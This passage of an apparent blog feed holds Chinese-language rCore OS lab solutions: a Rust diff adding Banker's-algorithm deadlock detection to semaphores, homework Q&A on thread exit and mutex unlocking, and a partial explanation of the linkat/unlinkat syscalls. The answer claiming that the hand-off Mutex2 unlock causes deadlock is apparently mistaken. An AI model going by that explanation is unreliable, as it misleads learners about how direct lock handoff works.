class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(index) = task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.sem_allocation[index].1 -= 1;</span><span class="token prefix inserted">+</span><span class="token line">        if task_inner.sem_allocation[index].1 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.sem_allocation.swap_remove(index);</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sem.up();</span><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -165,8 +257,89 @@ pub fn sys_semaphore_down(sem_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.sem_need = sem_id;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    if process_inner.dlcheck_option &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // initialize data structure for Banker's Algorithm:</span><span class="token prefix inserted">+</span><span class="token line">        // Avavilable Vector, Allocation Matrix, Need Matrix</span><span class="token prefix inserted">+</span><span class="token line">        let n = process_inner.tasks.len();</span><span class="token prefix inserted">+</span><span class="token line">        let m = process_inner.semaphore_list.len();</span><span class="token prefix inserted">+</span><span class="token line">        let mut available:Vec&lt;usize> = Vec::new();</span><span class="token prefix inserted">+</span><span class="token line">        for sem_opt in &amp;process_inner.semaphore_list &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match sem_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(sem) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let sem_inner = sem.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    available.push(max(sem_inner.count, 0) as usize);</span><span class="token prefix inserted">+</span><span class="token line">                    drop(sem_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => available.push(0),</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut allocation: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    for (id, alloc) in &amp;task_inner.sem_allocation &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        allocation[i][*id] += *alloc;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut need: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    let nid = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">                    if nid != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        need[i][nid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        if !deadlock_check(available, allocation, need) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -0xDEAD;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    sem.down();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// condvar create syscall</span></span>@@ -246,6 +419,81 @@ pub fn sys_condvar_wait(condvar_id: usize, mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">///</span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement deadlock detection, but might not all in this syscall</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_enable_deadlock_detect(_enabled: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_enable_deadlock_detect NOT IMPLEMENTED");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    trace!("kernel: sys_enable_deadlock_detect");</span><span class="token prefix inserted">+</span><span class="token line">    let process = current_process();</span><span class="token prefix inserted">+</span><span class="token line">    let mut process_inner = process.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let mut flag = 0;</span><span class="token prefix inserted">+</span><span class="token line">    match _enabled &#123;</span><span class="token prefix inserted">+</span><span class="token line">        0 => process_inner.dlcheck_option = false,</span><span class="token prefix inserted">+</span><span class="token line">        1 => process_inner.dlcheck_option = true,</span><span class="token prefix inserted">+</span><span class="token line">        _ => flag = -1,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(process_inner);</span><span class="token prefix inserted">+</span><span class="token line">    flag</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// Banker's Algoritm for dead lock check</span><span class="token prefix inserted">+</span><span class="token line">fn deadlock_check(available: Vec&lt;usize>, allocation: Vec&lt;Vec&lt;usize>>, need: Vec&lt;Vec&lt;usize>>) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    // n: thread count  m: resources count</span><span class="token prefix inserted">+</span><span class="token line">    let (n, m) = (allocation.len(), allocation[0].len());</span><span class="token prefix inserted">+</span><span class="token line">    let mut work = available;</span><span class="token prefix inserted">+</span><span class="token line">    let mut finish = vec![false; n];</span><span class="token prefix inserted">+</span><span class="token line">    loop &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        for i in 0..n &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let mut flag = true;</span><span class="token prefix inserted">+</span><span class="token line">            if finish[i] &#123;</span><span class="token prefix inserted">+</span><span class="token line">                continue;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            for j in 0..m &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if need[i][j] > work[j] &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    flag = false;</span><span class="token prefix inserted">+</span><span class="token line">                    break;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            if flag &#123;</span><span class="token prefix inserted">+</span><span class="token line">                idx = i;</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        // has found a thread meet the requirement</span><span class="token prefix inserted">+</span><span class="token line">        if idx != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            for j in 0..m &#123;</span><span class="token prefix inserted">+</span><span class="token line">                work[j] += allocation[idx][j];</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            finish[idx] = true;</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            break;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    finish.iter().all(|&amp;x| x)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span>diff --git a/os/src/task/process.rs b/os/src/task/process.rsindex c2be1ce..471c63a 100644<span class="token coord">--- a/os/src/task/process.rs</span><span class="token coord">+++ b/os/src/task/process.rs</span>@@ -49,6 +49,8 @@ pub struct ProcessControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub semaphore_list: Vec&lt;Option&lt;Arc&lt;Semaphore>>>,</span><span class="token prefix unchanged"> </span><span class="token line">    /// condvar list</span><span class="token prefix unchanged"> </span><span class="token line">    pub condvar_list: Vec&lt;Option&lt;Arc&lt;Condvar>>>,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// deadlock check option</span><span class="token prefix inserted">+</span><span class="token line">    pub dlcheck_option: bool,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl ProcessControlBlockInner &#123;</span></span>@@ -119,6 +121,7 @@ impl ProcessControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    mutex_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    semaphore_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    condvar_list: Vec::new(),</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    dlcheck_option: false,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -245,6 +248,7 @@ impl ProcessControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    mutex_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    semaphore_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    condvar_list: Vec::new(),</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    dlcheck_option: false,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 0136098..6818590 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span>@@ -5,7 +5,9 @@ use super::&#123;kstack_alloc, KernelStack, ProcessControlBlock, TaskContext&#125;;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;mm::PhysPageNum, sync::UPSafeCell&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use alloc::vec::Vec;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use core::cell::RefMut;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::usize;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Task control block structure</span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlock &#123;</span></span>@@ -41,6 +43,14 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub task_status: TaskStatus,</span><span class="token prefix unchanged"> </span><span class="token line">    /// It is set when active exit or execution error occurs</span><span class="token prefix unchanged"> </span><span class="token line">    pub exit_code: Option&lt;i32>,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The resources need of mutex</span><span class="token prefix inserted">+</span><span class="token line">    pub mutex_need: usize, // mutex id need (usize::MAX represents donot need any mutex)</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources need of semaphore</span><span class="token prefix inserted">+</span><span class="token line">    pub sem_need: usize,   // semaphore id need (usize::MAX represents donot need any semaphore)</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources allocated of mutex</span><span class="token prefix inserted">+</span><span class="token line">    pub mutex_allocation: Vec&lt;usize>,         // elem: mutex id allocated</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources allocated of semaphore</span><span class="token prefix inserted">+</span><span class="token line">    pub sem_allocation: Vec&lt;(usize, usize)>,  // elem: (sem id allocated, count allocated)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -75,6 +85,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kstack_top),</span><span class="token prefix unchanged"> </span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: None,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    mutex_need: usize::MAX,</span><span class="token prefix inserted">+</span><span class="token line">                    sem_need: usize::MAX,</span><span class="token prefix inserted">+</span><span class="token line">                    mutex_allocation: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    sem_allocation: Vec::new(),</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p>在我们的多线程实现中，当主线程 (即 0 号线程) 退出时，视为整个进程退出， 此时需要结束该进程管理的所有线程并回收其资源。</p><p><strong>Q1:</strong> 需要回收的资源有哪些？</p><p><strong>A1:</strong> 线程控制块、线程栈、互斥锁、信号量、条件变量等。</p><p><strong>Q2:</strong> 其他线程的 <code>TaskControlBlock</code> 可能在哪些位置被引用，分别是否需要回收，为什么？</p><p><strong>A2:</strong> 线程同步原语中，例如 rCore 信号量的等待队列 <code>wait_queue</code> 中，它们需要被回收，否则可能导致死锁或其他并发问题。</p><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p><strong>Q:</strong> 对比以下两种 <code>Mutex.unlock</code> 的实现，二者有什么区别？这些区别可能会导致什么问题？</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex1</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>A:</strong> </p><p>对于 <code>Mutex1</code>，如果有多个线程在等待锁，并且 <code>Mutex1</code> 解锁后立即唤醒一个等待的线程，而此时另一个线程已经获取了锁，那么被唤醒的线程可能会发现锁已经被其他线程持有，从而再次进入等待状态。这会导致不必要的额外等待和上下文切换。例如，假设线程 A 持有锁并解锁，线程 B 和 C 都在等待队列中。线程 A 解锁后，<code>mutex_inner.locked</code> 被设置为 <code>false</code>，然后唤醒线程 B。但在线程 B 开始执行之前，线程 C 已经获取了锁。此时，线程 B 会发现锁已被线程 C 持有，不得不重新进入等待队列。</p><p>对于 <code>Mutex2</code>，如果它解锁时有等待的任务，<code>mutex_inner.locked</code> 不会被设置为 <code>false</code>。这意味着当被唤醒的任务开始执行时，它会看到 <code>locked</code> 仍然是 <code>true</code>，尽管锁实际上已经被释放了。这种情况可能导致被唤醒的任务无法正确获取锁，因为它会认为锁仍然被其他线程持有，从而再次进入等待队列。这会导致死锁或无限循环。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter6练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/03/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter6%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/03/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter6%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-03T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:26.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="linkat"><a href="#linkat" class="headerlink" title="linkat"></a>linkat</h3><p>本实验需要实现 3 个与文件系统相关的系统调用，首先是用来创建文件硬链接的 <code>linkat</code>.</p><p>首先介绍一下什么是硬链接，硬链接作为一种抽象概念，可以看作指向一个文件实体的指针，类似于 C++ 中的智能指针 <code>shared_ptr</code>。而从内核代码的角度来看，硬链接在文件系统中的实体就是 <strong>文件目录项</strong> 。每个硬链接对应一个目录项，这个目录项指向一个相同的索引节点（inode），每个 inode 存储了文件的实际数据块（的指针）及其元数据（文件大小、文件类型等）。</p><p>由于 rCore 的文件系统被简化为单级目录（只包含根目录），因此实现 <code>linkat</code> 的思路就很清晰了：根据文件名 <code>old_name</code> 查找其对应的 inode，获取 inode_id 并将引用计数加一，创建一个新的目录项 <code>(new_name, inode_id)</code>，将其插入根目录的数据段末尾。</p><p>需要注意的是，rCore 文件系统的 inode 分为虚拟文件系统层的 <code>Inode</code> 和在持久化设备（硬盘）上实际存储的 <code>DistInode</code>，可以通过 <code>Inode</code> 所实现的 <code>read_disk_inode</code> 和 <code>modify_disk_inode</code> 读取或修改其对应的 <code>DiskInode</code>。因此实际的代码实现，可以按照以下几个步骤进行：</p><ol><li>使用 <code>self.find(old_name)</code> 查找当前目录（<code>ROOT_DIR</code>）下的名为 <code>old_name</code> 的文件对应的 <code>Inode</code>，引用名为 <code>inode</code>。</li><li>使用 <code>self.read_disk_inode()</code> 获取当前目录的 <code>DiskInode</code> 的只读引用。获取当前目录下 <code>old_name</code> 文件的 inode_id；获取当前目录的文件数据（目录的文件数据全部由目录项构成）的总大小，记为 <code>offset</code>，用于最后将新目录项添加至末尾。</li><li>使用 <code>inode.modify_disk_inode</code> 获取 <code>old_name</code> 文件的 <code>DiskInode</code> 的可变引用。将其引用计数（原本没有该字段，需要自行添加）加一。</li><li>创建新的目录项，并使用 <code>self.write_at</code> 将其写入偏移量为 <code>offset</code> 的位置。</li></ol><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Create a hard link with new_name for file with old_name</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">linkat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> old_name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> new_name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">isize</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// get inode of file with old_name</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>old_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> inode<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> inode<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">// inode id</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment">// last position of data of inode</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">read_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        id <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find_inode_id</span><span class="token punctuation">(</span>old_name<span class="token punctuation">,</span> dinode<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        offset <span class="token operator">=</span> dinode<span class="token punctuation">.</span>size <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    inode<span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        dinode<span class="token punctuation">.</span>nlink <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// increase reference count</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> new_entry <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// insert a new directory entry into ROOT_DIR</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">write_at</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> new_entry<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">0</span><span class="token punctuation">&#125;</span></code></pre><h3 id="unlinkat"><a href="#unlinkat" class="headerlink" title="unlinkat"></a>unlinkat</h3><p>第二个需要实现的是取消硬链接的 <code>unlinkat</code>，基本思路为：根据文件名 <code>name</code> 查找对应的 inode，将引用计数减一，最后将其根目录下对应的目录项移除。下面直接介绍具体实现方法：</p><ol><li>使用 <code>self.find(name)</code> 查找当前目录（<code>ROOT_DIR</code>）下的名为 <code>name</code> 的文件对应的 <code>Inode</code>，引用名为 <code>inode</code>。</li><li>使用 <code>inode.modify_disk_inode()</code> 获取 <code>inode</code> 文件的 <code>DiskInode</code> 的可变引用。将引用计数减一，如果引用计数减为零，代表该文件的所有硬链接都被解除，此时可以使用 <code>inode.clear()</code> 释放该文件 inode 和数据的内存空间。</li><li>使用 <code>self.modify_disk_inode()</code> 获取当前目录的 <code>DiskInode</code> 的可变引用。遍历当前目录下的所有目录项，将名称为 